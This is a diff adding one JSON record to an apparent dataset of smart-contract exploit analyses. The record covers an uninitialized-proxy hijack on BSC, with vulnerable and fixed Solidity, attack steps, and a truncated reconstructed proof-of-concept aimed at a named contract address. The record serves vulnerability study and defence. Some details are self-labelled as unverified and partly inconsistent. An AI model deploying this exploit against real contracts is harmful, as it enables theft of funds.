@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-02-12_Unverified_d4f1_UninitializedProxy",
+ "source_file": "2025/2025-02-12_Unverified_d4f1_UninitializedProxy.md",
+ "title": "Unverified Contract (d4f1) — Uninitialized Proxy Vulnerability Analysis",
+ "date": "2025-02-12",
+ "protocol": "Unverified Contract",
+ "chain": "BSC",
+ "loss_raw": "~$15,200",
+ "loss_usd": 15200.0,
+ "root_cause": "The proxy contract's `initialize()` function was never called after deployment, allowing anyone to initialize it and execute `withdrawFees()` without authorization",
+ "attack_tx": "0xc7fc7e06...",
+ "vulnerable_contract": "0xd4f1afd0...",
+ "classes": [
+  "proxy-storage"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no protection on initialize()\ncontract VulnerableProxy {\n    address public owner;\n    bool public initialized;\n\n    // Anyone can initialize — was never called after deployment\n    function initialize(address _owner) external {\n        // No check for initialized!\n        owner = _owner;\n        initialized = true;\n    }\n\n    function withdrawFees(address _to, uint256 _amount) external {\n        require(msg.sender == owner, \"Not owner\");\n        // No zero address validation\n        payable(_to).transfer(_amount);\n    }\n}\n\n//",
+  "// ⚠️ RECONSTRUCTED — not verified source. Derived from PoC + on-chain trace.\n// Contract: 0xd4f1afd0331255e848c119ca39143d41144f7cb3 (BSC)\n\ncontract VulnerableProxy {\n    address public owner;\n    bool private _initialized;\n\n    // ❌ No `initializer` guard — can be called by anyone after deployment\n    // The proxy was deployed but initialize() was never called by the deployer.\n    function initialize(address _owner) external {\n        // ❌ Missing: require(!_initialized, \"Already initialized\");\n        owner = _owner;          // ❌ Attacker sets themselves as owner\n        _initialized = true;\n    }\n\n    // ❌ Callable immediately once attacker owns the contract\n    function withdrawFees(address _to, uint256 _amount) external {\n        require(msg.sender == owner, \"Not owner\"); // passes after attacker initializes\n        // ❌ No zero-address check, no amount cap\n        payable(_to).transfer(_amount);            // drains contract balance\n    }\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: re-initialization protection + immediate initialization on deployment\ncontract SafeProxy is Initializable {\n    address public owner;\n\n    // Uses OpenZeppelin Initializable — can only be called once\n    function initialize(address _owner) external initializer {\n        require(_owner != address(0), \"Zero address\");\n        owner = _owner;\n    }\n\n    function withdrawFees(address _to, uint256 _amount) external {\n        require(msg.sender == owner, \"Not owner\");\n        require(_to != address(0), \"Zero address\");\n        require(_amount > 0 && _amount <= address(this).balance, \"Invalid amount\");\n        payable(_to).transfer(_amount);\n    }\n}",
+  "// ✅ Fix: use OpenZeppelin Initializable modifier\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\ncontract SafeProxy is Initializable {\n    address public owner;\n\n    // ✅ `initializer` modifier ensures this can only ever be called once\n    function initialize(address _owner) external initializer {\n        require(_owner != address(0), \"Zero address\");\n        owner = _owner;\n    }\n\n    function withdrawFees(address _to, uint256 _amount) external {\n        require(msg.sender == owner, \"Not owner\");\n        require(_to != address(0), \"Zero address recipient\");\n        require(_amount > 0 && _amount <= address(this).balance, \"Invalid amount\");\n        payable(_to).transfer(_amount);\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Deploy attack contract (funded with 23.007 ETH)",
+  "→ [2] Call vulnerable.initialize(attackerAddress)",
+  "Uninitialized state → attacker sets themselves as owner",
+  "→ [3] Call vulnerable.withdrawFees(address(0), largeAmount)",
+  "Transfer to zero address → attacker receives funds via internal logic",
+  "→ [4] Extracted funds → transferred to tx.origin (attacker)",
+  "→ [5] ~$15,200 drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Deploy attack contract (funded with 23.007 ETH)\n  │         └─ Attack executes automatically from constructor\n  │\n  ├─→ [2] Call vulnerable.initialize(attackerAddress)\n  │         └─ Uninitialized state → attacker sets themselves as owner\n  │\n  ├─→ [3] Call vulnerable.withdrawFees(address(0), largeAmount)\n  │         └─ Owner check passes (attacker is owner)\n  │            Transfer to zero address → attacker receives funds via internal logic\n  │\n  ├─→ [4] Extracted funds → transferred to tx.origin (attacker)\n  │\n  └─→ [5] ~$15,200 drained",
+  "// Full PoC not obtained — reconstructed from summary\n\ncontract AttackerC {\n    address constant VULNERABLE = 0xd4f1afd0331255e848c119ca39143d41144f7cb3;\n\n    constructor() payable {\n        // Execute attack immediately from constructor (can bypass isContract() check)\n        HelperB helper = new HelperB();\n        helper.exploit{value: address(this).balance}(VULNERABLE);\n\n        // Transfer profit\n        payable(tx.origin).transfer(address(this).balance);\n    }\n\n    receive() external payable {}\n}\n\ncontract HelperB {\n    function exploit(address vulnerable) external payable {\n        // [2] Call initialize() on the uninitialized proxy\n        // → Sets attacker (address(this)) as owner\n        IVulnerable(vulnerable).initialize(address(this));\n\n        // [3] Call withdrawFees (zero ad"
+ ]
+}
